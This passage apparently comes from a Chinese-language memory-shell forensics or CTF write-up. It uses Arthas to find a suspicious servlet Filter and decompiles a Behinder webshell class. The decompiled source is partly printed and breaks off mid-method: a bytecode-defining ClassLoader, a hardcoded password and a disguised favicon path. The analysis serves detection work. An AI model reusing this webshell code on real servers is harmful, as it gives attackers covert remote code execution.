+</h2><p>过滤Filter类，发现可疑包名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">sc</span> <span class="o">*</span><span class="nx">Filter</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746532990112-20250506200316-pipfqwu.png" alt="QQ_1746532990112" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746532990112-20250506200316-pipfqwu.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746532990112-20250506200316-pipfqwu.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746532990112-20250506200316-pipfqwu.png?size=large 2x" data-title="QQ_1746532990112" style="--width: 1806px;--aspect-ratio: 1806 / 876;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="nx">com</span><span class="o">.</span><span class="nx">summersec</span><span class="o">.</span><span class="nx">x</span><span class="o">.</span><span class="nx">BehinderFilter</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>‍</p>
+<p>使用jad 可以反编译内存马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span><span class="lnt">286
+</span><span class="lnt">287
+</span><span class="lnt">288
+</span><span class="lnt">289
+</span><span class="lnt">290
+</span><span class="lnt">291
+</span><span class="lnt">292
+</span><span class="lnt">293
+</span><span class="lnt">294
+</span><span class="lnt">295
+</span><span class="lnt">296
+</span><span class="lnt">297
+</span><span class="lnt">298
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">arthas</span><span class="o">@</span><span class="mi">1</span><span class="p">]</span><span class="err">$</span> <span class="nx">jad</span> <span class="nx">com</span><span class="o">.</span><span class="nx">summersec</span><span class="o">.</span><span class="nx">x</span><span class="o">.</span><span class="nx">BehinderFilter</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ClassLoader</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">+-</span><span class="nx">com</span><span class="o">.</span><span class="nx">sun</span><span class="o">.</span><span class="nx">org</span><span class="o">.</span><span class="nx">apache</span><span class="o">.</span><span class="nx">xalan</span><span class="o">.</span><span class="nx">internal</span><span class="o">.</span><span class="nx">xsltc</span><span class="o">.</span><span class="nx">trax</span><span class="o">.</span><span class="nx">TemplatesImpl</span><span class="nv">$TransletClassLoader</span><span class="o">@</span><span class="mi">7</span><span class="nx">baad6dd</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">+-</span><span class="nx">org</span><span class="o">.</span><span class="nx">springframework</span><span class="o">.</span><span class="nx">boot</span><span class="o">.</span><span class="nx">loader</span><span class="o">.</span><span class="nx">LaunchedURLClassLoader</span><span class="o">@</span><span class="mi">5197848</span><span class="nx">c</span>
+</span></span><span class="line"><span class="cl">      <span class="o">+-</span><span class="nx">sun</span><span class="o">.</span><span class="nx">misc</span><span class="o">.</span><span class="nx">Launcher</span><span class="nv">$AppClassLoader</span><span class="o">@</span><span class="mi">55</span><span class="nx">f96302</span>
+</span></span><span class="line"><span class="cl">        <span class="o">+-</span><span class="nx">sun</span><span class="o">.</span><span class="nx">misc</span><span class="o">.</span><span class="nx">Launcher</span><span class="nv">$ExtClassLoader</span><span class="o">@</span><span class="mi">7</span><span class="nx">d6cbd9f</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Location</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">         * Decompiled with CFR.
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *
+</span></span></span><span class="line"><span class="cl"><span class="cm">         * Could not load the following classes:
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.DispatcherType
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.Filter
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.FilterChain
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.FilterConfig
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.FilterRegistration$Dynamic
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.ServletContext
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.ServletException
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.ServletRequest
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.ServletRequestWrapper
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.ServletResponse
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.ServletResponseWrapper
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.http.HttpServletRequest
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.http.HttpServletResponse
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  javax.servlet.http.HttpSession
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  org.apache.catalina.LifecycleState
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  org.apache.catalina.connector.RequestFacade
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  org.apache.catalina.connector.ResponseFacade
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  org.apache.catalina.core.ApplicationContext
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  org.apache.catalina.core.StandardContext
+</span></span></span><span class="line"><span class="cl"><span class="cm">         *  org.apache.catalina.util.LifecycleBase
+</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">package</span> <span class="nx">com</span><span class="o">.</span><span class="nx">summersec</span><span class="o">.</span><span class="nx">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">java</span><span class="o">.</span><span class="nx">io</span><span class="o">.</span><span class="nx">IOException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">java</span><span class="o">.</span><span class="nx">lang</span><span class="o">.</span><span class="nx">reflect</span><span class="o">.</span><span class="nx">Field</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">java</span><span class="o">.</span><span class="nx">lang</span><span class="o">.</span><span class="nx">reflect</span><span class="o">.</span><span class="nx">Method</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">java</span><span class="o">.</span><span class="nx">math</span><span class="o">.</span><span class="nx">BigInteger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">java</span><span class="o">.</span><span class="nx">security</span><span class="o">.</span><span class="nx">MessageDigest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">java</span><span class="o">.</span><span class="nx">util</span><span class="o">.</span><span class="nx">EnumSet</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">java</span><span class="o">.</span><span class="nx">util</span><span class="o">.</span><span class="nx">HashMap</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">crypto</span><span class="o">.</span><span class="nx">Cipher</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">crypto</span><span class="o">.</span><span class="nx">spec</span><span class="o">.</span><span class="nx">SecretKeySpec</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">DispatcherType</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">Filter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">FilterChain</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">FilterConfig</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">FilterRegistration</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">ServletContext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">ServletException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">ServletRequest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">ServletRequestWrapper</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">ServletResponse</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">ServletResponseWrapper</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">http</span><span class="o">.</span><span class="nx">HttpServletRequest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">http</span><span class="o">.</span><span class="nx">HttpServletResponse</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">javax</span><span class="o">.</span><span class="nx">servlet</span><span class="o">.</span><span class="nx">http</span><span class="o">.</span><span class="nx">HttpSession</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">apache</span><span class="o">.</span><span class="nx">catalina</span><span class="o">.</span><span class="nx">LifecycleState</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">apache</span><span class="o">.</span><span class="nx">catalina</span><span class="o">.</span><span class="nx">connector</span><span class="o">.</span><span class="nx">RequestFacade</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">apache</span><span class="o">.</span><span class="nx">catalina</span><span class="o">.</span><span class="nx">connector</span><span class="o">.</span><span class="nx">ResponseFacade</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">apache</span><span class="o">.</span><span class="nx">catalina</span><span class="o">.</span><span class="nx">core</span><span class="o">.</span><span class="nx">ApplicationContext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">apache</span><span class="o">.</span><span class="nx">catalina</span><span class="o">.</span><span class="nx">core</span><span class="o">.</span><span class="nx">StandardContext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">apache</span><span class="o">.</span><span class="nx">catalina</span><span class="o">.</span><span class="nx">util</span><span class="o">.</span><span class="nx">LifecycleBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">final</span> <span class="k">class</span> <span class="nc">BehinderFilter</span>
+</span></span><span class="line"><span class="cl">        <span class="k">extends</span> <span class="nx">ClassLoader</span>
+</span></span><span class="line"><span class="cl">        <span class="k">implements</span> <span class="nx">Filter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">HttpServletRequest</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">HttpServletResponse</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">String</span> <span class="nx">cs</span> <span class="o">=</span> <span class="s2">&#34;UTF-8&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">String</span> <span class="nx">Pwd</span> <span class="o">=</span> <span class="s2">&#34;eac9fa38330a7535&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">String</span> <span class="nx">path</span> <span class="o">=</span> <span class="s2">&#34;/favicondemo.ico&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">BehinderFilter</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">BehinderFilter</span><span class="p">(</span><span class="nx">ClassLoader</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 37*/</span>         <span class="nx">super</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="k">Class</span> <span class="nc">g</span><span class="p">(</span><span class="nx">byte</span><span class="p">[]</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 41*/</span>         <span class="k">return</span> <span class="nx">super</span><span class="o">.</span><span class="nx">defineClass</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">b</span><span class="o">.</span><span class="nx">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="k">static</span> <span class="nx">String</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">String</span> <span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 45*/</span>         <span class="nx">String</span> <span class="nx">ret</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 48*/</span>             <span class="nx">MessageDigest</span> <span class="nx">m</span> <span class="o">=</span> <span class="nx">MessageDigest</span><span class="o">.</span><span class="nx">getInstance</span><span class="p">(</span><span class="s2">&#34;MD5&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 49*/</span>             <span class="nx">m</span><span class="o">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">s</span><span class="o">.</span><span class="nx">getBytes</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">s</span><span class="o">.</span><span class="nx">length</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigInteger</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">m</span><span class="o">.</span><span class="nx">digest</span><span class="p">())</span><span class="o">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">exception</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// empty catch block
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 54*/</span>         <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">boolean</span> <span class="nx">equals</span><span class="p">(</span><span class="nx">Object</span> <span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 58*/</span>         <span class="k">this</span><span class="o">.</span><span class="nx">parseObj</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 59*/</span>         <span class="k">this</span><span class="o">.</span><span class="nx">Pwd</span> <span class="o">=</span> <span class="nx">BehinderFilter</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="k">this</span><span class="o">.</span><span class="nx">request</span><span class="o">.</span><span class="nx">getHeader</span><span class="p">(</span><span class="s2">&#34;p&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 60*/</span>         <span class="k">this</span><span class="o">.</span><span class="nx">path</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="nx">request</span><span class="o">.</span><span class="nx">getHeader</span><span class="p">(</span><span class="s2">&#34;path&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">StringBuffer</span> <span class="nx">output</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">StringBuffer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 62*/</span>         <span class="nx">String</span> <span class="nx">tag_s</span> <span class="o">=</span> <span class="s2">&#34;-&gt;|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 63*/</span>         <span class="nx">String</span> <span class="nx">tag_e</span> <span class="o">=</span> <span class="s2">&#34;|&lt;-&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 66*/</span>             <span class="k">this</span><span class="o">.</span><span class="nx">response</span><span class="o">.</span><span class="nx">setContentType</span><span class="p">(</span><span class="s2">&#34;text/html&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 67*/</span>             <span class="k">this</span><span class="o">.</span><span class="nx">request</span><span class="o">.</span><span class="nx">setCharacterEncoding</span><span class="p">(</span><span class="k">this</span><span class="o">.</span><span class="nx">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 68*/</span>             <span class="k">this</span><span class="o">.</span><span class="nx">response</span><span class="o">.</span><span class="nx">setCharacterEncoding</span><span class="p">(</span><span class="k">this</span><span class="o">.</span><span class="nx">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 69*/</span>             <span class="nx">output</span><span class="o">.</span><span class="nx">append</span><span class="p">(</span><span class="k">this</span><span class="o">.</span><span class="nx">addFilter</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">var7</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 71*/</span>             <span class="nx">output</span><span class="o">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">&#34;ERROR:// &#34;</span> <span class="o">+</span> <span class="nx">var7</span><span class="o">.</span><span class="nx">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
